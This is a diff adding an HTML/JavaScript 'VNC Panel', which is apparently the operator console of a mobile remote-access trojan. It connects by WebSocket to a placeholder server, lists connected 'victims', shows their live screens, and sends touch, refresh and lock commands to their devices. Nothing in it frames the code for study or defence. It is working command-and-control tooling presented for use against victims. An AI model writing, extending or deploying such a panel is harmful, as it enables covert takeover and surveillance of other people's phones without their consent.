@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>VNC Panel - Remote Control</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .header { background: #1a1a1a; padding: 10px 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #00ff88; }
+        .header h1 { font-size: 1.2rem; color: #00ff88; }
+        .status { font-size: 0.8rem; padding: 5px 10px; border-radius: 15px; background: #333; }
+        .status.connected { background: #00cc66; color: #000; }
+        .status.disconnected { background: #cc0000; }
+        .victim-bar { background: #111; padding: 8px 15px; display: flex; gap: 8px; overflow-x: auto; border-bottom: 1px solid #333; }
+        .victim-btn { padding: 6px 14px; border-radius: 20px; border: 1px solid #555; background: #222; color: #ccc; font-size: 0.8rem; cursor: pointer; white-space: nowrap; }
+        .victim-btn.active { background: #00ff88; color: #000; border-color: #00ff88; font-weight: bold; }
+        .screen-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; overflow: auto; position: relative; }
+        canvas { max-width: 100%; max-height: 100%; cursor: crosshair; }
+        .no-victim { text-align: center; color: #666; }
+        .no-victim h2 { font-size: 2rem; margin-bottom: 10px; }
+        .toolbar { background: #1a1a1a; padding: 8px 15px; display: flex; gap: 10px; justify-content: center; border-top: 1px solid #333; }
+        .tool-btn { padding: 8px 16px; border-radius: 8px; border: none; background: #333; color: #fff; font-size: 0.8rem; cursor: pointer; }
+        .tool-btn.danger { background: #cc0000; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🖥️ VNC Panel</h1>
+        <span class="status disconnected" id="status">Disconnected</span>
+    </div>
+    <div class="victim-bar" id="victimBar">
+        <span style="color:#666; font-size:0.8rem; padding:6px;">No victims connected...</span>
+    </div>
+    <div class="screen-container" id="screenContainer">
+        <div class="no-victim" id="noVictim">
+            <h2>📱</h2>
+            <p>Waiting for victim...</p>
+        </div>
+        <canvas id="screen" style="display:none;"></canvas>
+    </div>
+    <div class="toolbar">
+        <button class="tool-btn" onclick="refreshScreen()">🔄 Refresh</button>
+        <button class="tool-btn" onclick="lockScreen()">🔒 Lock</button>
+        <button class="tool-btn danger" onclick="clearData()">🗑️ Clear</button>
+    </div>
+    <script>
+        const SERVER_URL = 'ws://YOUR_RENDER_URL:8080';
+        let ws = null;
+        let currentVictim = null;
+        let victims = [];
+        let isConnected = false;
+        let isDragging = false;
+        const canvas = document.getElementById('screen');
+        const ctx = canvas.getContext('2d');
+        const noVictim = document.getElementById('noVictim');
+        const statusEl = document.getElementById('status');
+        const victimBar = document.getElementById('victimBar');
+
+        function connect() {
+            ws = new WebSocket(SERVER_URL);
+            ws.onopen = () => {
+                isConnected = true;
+                statusEl.textContent = 'Connected';
+                statusEl.className = 'status connected';
+                ws.send('REGISTER:PANEL');
+            };
+            ws.onmessage = (event) => {
+                try {
+                    const msg = JSON.parse(event.data);
+                    handleJSONMessage(msg);
+                } catch (e) {
+                    if (event.data instanceof Blob) {
+                        handleScreenFrame(event.data);
+                    }
+                }
+            };
+            ws.onclose = () => {
+                isConnected = false;
+                statusEl.textContent = 'Disconnected';
+                statusEl.className = 'status disconnected';
+                setTimeout(connect, 5000);
+            };
+        }
+
+        function handleJSONMessage(msg) {
+            switch(msg.type) {
+                case 'victimList':
+                    victims = msg.victims || [];
+                    updateVictimBar();
+                    break;
+                case 'victimConnected':
+                    if (!victims.includes(msg.victimId)) {
+                        victims.push(msg.victimId);
+                        updateVictimBar();
+                    }
+                    break;
+                case 'victimDisconnected':
+                    victims = victims.filter(v => v !== msg.victimId);
+                    if (currentVictim === msg.victimId) {
+                        currentVictim = null;
+                        hideScreen();
+                    }
+                    updateVictimBar();
+                    break;
+            }
+        }
+
+        function handleScreenFrame(blob) {
+            const reader = new FileReader();
+            reader.onload = () => {
+                const img = new Image();
+                img.onload = () => {
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                    ctx.drawImage(img, 0, 0);
+                    showScreen();
+                };
+                img.src = reader.result;
+            };
+            reader.readAsDataURL(blob);
+        }
+
+        function showScreen() {
+            canvas.style.display = 'block';
+            noVictim.style.display = 'none';
+        }
+
+        function hideScreen() {
+            canvas.style.display = 'none';
+            noVictim.style.display = 'block';
+        }
+
+        function updateVictimBar() {
+            if (victims.length === 0) {
+                victimBar.innerHTML = '<span style="color:#666; font-size:0.8rem; padding:6px;">No victims connected...</span>';
+                return;
+            }
+            victimBar.innerHTML = victims.map(v => {
+                const active = v === currentVictim ? ' active' : '';
+                return `<button class="victim-btn${active}" onclick="selectVictim('${v}')">📱 ${v}</button>`;
+            }).join('');
+        }
+
+        function selectVictim(victimId) {
+            currentVictim = victimId;
+            updateVictimBar();
+            hideScreen();
+        }
+
+        canvas.addEventListener('mousedown', (e) => {
+            if (!currentVictim) return;
+            isDragging = true;
+            sendTouchEvent(e.clientX, e.clientY);
+        });
+
+        canvas.addEventListener('mousemove', (e) => {
+            if (!isDragging || !currentVictim) return;
+            sendTouchEvent(e.clientX, e.clientY);
+        });
+
+        canvas.addEventListener('mouseup', () => { isDragging = false; });
+
+        canvas.addEventListener('touchstart', (e) => {
+            if (!currentVictim) return;
+            e.preventDefault();
+            isDragging = true;
+            const touch = e.touches[0];
+            sendTouchEvent(touch.clientX, touch.clientY);
+        });
+
+        canvas.addEventListener('touchmove', (e) => {
+            if (!isDragging || !currentVictim) return;
+            e.preventDefault();
+            const touch = e.touches[0];
+            sendTouchEvent(touch.clientX, touch.clientY);
+        });
+
+        canvas.addEventListener('touchend', () => { isDragging = false; });
+
+        function sendTouchEvent(clientX, clientY) {
+            const rect = canvas.getBoundingClientRect();
+            const scaleX = canvas.width / rect.width;
+            const scaleY = canvas.height / rect.height;
+            const x = (clientX - rect.left) * scaleX;
+            const y = (clientY - rect.top) * scaleY;
+            if (ws && ws.readyState === WebSocket.OPEN && currentVictim) {
+                ws.send(JSON.stringify({ type: 'touch', victimId: currentVictim, x: x, y: y }));
+            }
+        }
+
+        function refreshScreen() { hideScreen(); if (currentVictim && ws) { ws.send(JSON.stringify({ type: 'refresh', victimId: currentVictim })); } }
+        function lockScreen() { if (currentVictim && ws) { ws.send(JSON.stringify({ type: 'lock', victimId: currentVictim })); } }
+        function clearData() { if (confirm('Clear all victim data?')) { victims = []; currentVictim = null; hideScreen(); updateVictimBar(); } }
+
+        connect();
+    </script>
+</body>
+</html>
